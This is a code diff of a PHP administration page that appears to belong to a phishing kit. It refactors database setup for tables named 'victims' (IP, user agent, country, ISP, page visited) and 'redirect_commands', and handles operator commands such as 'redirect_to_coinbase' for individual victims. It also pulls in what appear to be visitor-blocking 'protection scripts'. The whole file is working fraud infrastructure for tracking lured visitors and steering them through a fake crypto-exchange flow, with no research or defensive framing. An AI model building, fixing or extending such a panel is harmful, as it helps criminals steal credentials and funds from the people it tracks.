@@ -15,6 +15,63 @@ if (!is_logged_in()) {
 // Then include protection scripts
 require_once __DIR__ . '/blocker-raw.php';
 
+// Initialize database connection FIRST
+$database = new Database();
+$db = $database->getConnection();
+
+// Create necessary tables
+try {
+    // Create redirect_commands table if not exists
+    $create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
+        id SERIAL PRIMARY KEY,
+        command VARCHAR(50) NOT NULL,
+        target TEXT NOT NULL,
+        victim_id INTEGER DEFAULT NULL,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )";
+    $db->exec($create_table);
+    
+    // Ensure victim_id column exists
+    $check_column = $db->query("SELECT column_name FROM information_schema.columns WHERE table_name = 'redirect_commands' AND column_name = 'victim_id'");
+    if ($check_column->rowCount() == 0) {
+        $alter_table = "ALTER TABLE redirect_commands ADD COLUMN victim_id INTEGER DEFAULT NULL";
+        $db->exec($alter_table);
+    }
+} catch (Exception $e) {
+    error_log("Redirect commands table error: " . $e->getMessage());
+}
+
+// Create victims table if not exists
+try {
+    $create_victims_table = "CREATE TABLE IF NOT EXISTS victims (
+        id SERIAL PRIMARY KEY,
+        ip_address VARCHAR(45) NOT NULL,
+        user_agent TEXT,
+        country VARCHAR(100),
+        isp VARCHAR(200),
+        last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        status VARCHAR(20) DEFAULT 'active',
+        page_visited VARCHAR(255) DEFAULT 'index.php',
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )";
+    $db->exec($create_victims_table);
+} catch (Exception $e) {
+    error_log("Victims table error: " . $e->getMessage());
+}
+
+// Create case_settings table if not exists
+try {
+    $create_case_table = "CREATE TABLE IF NOT EXISTS case_settings (
+        id SERIAL PRIMARY KEY,
+        setting_name VARCHAR(100) UNIQUE NOT NULL,
+        setting_value TEXT NOT NULL,
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )";
+    $db->exec($create_case_table);
+} catch (Exception $e) {
+    error_log("Case settings table error: " . $e->getMessage());
+}
+
 // Handle logout
 if (isset($_GET['action']) && $_GET['action'] === 'logout') {
     logout();
@@ -22,16 +79,12 @@ if (isset($_GET['action']) && $_GET['action'] === 'logout') {
     exit;
 }
 
-// Handle redirect commands
+// Handle all POST actions
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     // Handle redirect commands
     if (isset($_POST['redirect_command'])) {
         $command = $_POST['redirect_command'];
         $target = $_POST['redirect_target'] ?? '';
-        
-        // Use database instead of file
-        $database = new Database();
-        $db = $database->getConnection();
         
         switch($command) {
             case 'redirect_to_coinbase':
@@ -73,9 +126,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_POST['redirect_victim'])) {
         $victim_id = $_POST['victim_id'];
         $redirect_target = $_POST['victim_redirect_target'];
-        
-        $database = new Database();
-        $db = $database->getConnection();
         
         // Update the redirect command for this specific victim
         $query = "INSERT INTO redirect_commands (command, target, victim_id, created_at) 
@@ -122,89 +172,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     exit;
 }
 
-// Get current redirect status from database
-$database = new Database();
-$db = $database->getConnection();
-
-// Create redirect_commands table if not exists
-try {
-    $create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
-        id SERIAL PRIMARY KEY,
-        command VARCHAR(50) NOT NULL,
-        target TEXT NOT NULL,
-        victim_id INTEGER DEFAULT NULL,
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-    )";
-    $db->exec($create_table);
-    
-    // FIX: Ensure victim_id column exists in redirect_commands table
-    $check_column = $db->query("SELECT column_name FROM information_schema.columns WHERE table_name = 'redirect_commands' AND column_name = 'victim_id'");
-    if ($check_column->rowCount() == 0) {
-        $alter_table = "ALTER TABLE redirect_commands ADD COLUMN victim_id INTEGER DEFAULT NULL";
-        $db->exec($alter_table);
-        error_log("Added victim_id column to redirect_commands table");
-    }
-} catch (Exception $e) {
-    error_log("Redirect commands table error: " . $e->getMessage());
-}
-
-// Create victims table if not exists - COMPLETE VERSION
-try {
-    $create_victims_table = "CREATE TABLE IF NOT EXISTS victims (
-        id SERIAL PRIMARY KEY,
-        ip_address VARCHAR(45) NOT NULL,
-        user_agent TEXT,
-        country VARCHAR(100),
-        isp VARCHAR(200),
-        last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-        status VARCHAR(20) DEFAULT 'active',
-        page_visited VARCHAR(255) DEFAULT 'index.php',
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-    )";
-    $db->exec($create_victims_table);
-    
-    // FIX: Ensure ALL columns exist in victims table
-    $columns_to_check = ['country', 'isp', 'last_activity', 'status', 'page_visited'];
-    foreach ($columns_to_check as $column) {
-        try {
-            $check_column = $db->query("SELECT column_name FROM information_schema.columns WHERE table_name = 'victims' AND column_name = '$column'");
-            if ($check_column->rowCount() == 0) {
-                if ($column == 'country') {
-                    $alter_table = "ALTER TABLE victims ADD COLUMN country VARCHAR(100)";
-                } elseif ($column == 'isp') {
-                    $alter_table = "ALTER TABLE victims ADD COLUMN isp VARCHAR(200)";
-                } elseif ($column == 'last_activity') {
-                    $alter_table = "ALTER TABLE victims ADD COLUMN last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP";
-                } elseif ($column == 'status') {
-                    $alter_table = "ALTER TABLE victims ADD COLUMN status VARCHAR(20) DEFAULT 'active'";
-                } elseif ($column == 'page_visited') {
-                    $alter_table = "ALTER TABLE victims ADD COLUMN page_visited VARCHAR(255) DEFAULT 'index.php'";
-                }
-                $db->exec($alter_table);
-                error_log("Added $column column to victims table");
-            }
-        } catch (Exception $e) {
-            error_log("Column check for $column failed: " . $e->getMessage());
-        }
-    }
-} catch (Exception $e) {
-    error_log("Victims table error: " . $e->getMessage());
-}
-
-// Create case_settings table if not exists
-try {
-    $create_case_table = "CREATE TABLE IF NOT EXISTS case_settings (
-        id SERIAL PRIMARY KEY,
-        setting_name VARCHAR(100) UNIQUE NOT NULL,
-        setting_value TEXT NOT NULL,
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-    )";
-    $db->exec($create_case_table);
-} catch (Exception $e) {
-    error_log("Case settings table error: " . $e->getMessage());
-}
-
-// Get current redirect - FIXED VERSION
+// Get current redirect
 try {
     $query = "SELECT target FROM redirect_commands WHERE command = 'redirect' AND victim_id IS NULL ORDER BY created_at DESC LIMIT 1";
     $stmt = $db->query($query);
@@ -217,7 +185,6 @@ try {
         $current_redirect = $stmt->fetch(PDO::FETCH_ASSOC);
     } catch (Exception $e2) {
         $current_redirect = false;
-        error_log("Failed to get redirect: " . $e2->getMessage());
     }
 }
 $current_redirect = $current_redirect ? $current_redirect['target'] : 'None';
@@ -233,7 +200,7 @@ try {
     error_log("Failed to get case ID: " . $e->getMessage());
 }
 
-// Get active victims (last 30 minutes) - FIXED VERSION
+// Get active victims (last 30 minutes)
 $active_victims = [];
 try {
     $active_victims_query = "SELECT * FROM victims 
@@ -248,9 +215,7 @@ try {
         $active_victims_query = "SELECT * FROM victims ORDER BY created_at DESC LIMIT 50";
         $active_victims_stmt = $db->query($active_victims_query);
         $active_victims = $active_victims_stmt->fetchAll(PDO::FETCH_ASSOC);
-        error_log("Using fallback query for victims");
     } catch (Exception $e2) {
-        error_log("Failed to get victims: " . $e2->getMessage());
         $active_victims = [];
     }
 }
@@ -263,7 +228,6 @@ try {
     $total_victims_result = $total_victims_stmt->fetch(PDO::FETCH_ASSOC);
     $total_victims = $total_victims_result ? $total_victims_result['total'] : 0;
 } catch (PDOException $e) {
-    error_log("Failed to get total victims count: " . $e->getMessage());
     $total_victims = 0;
 }
 
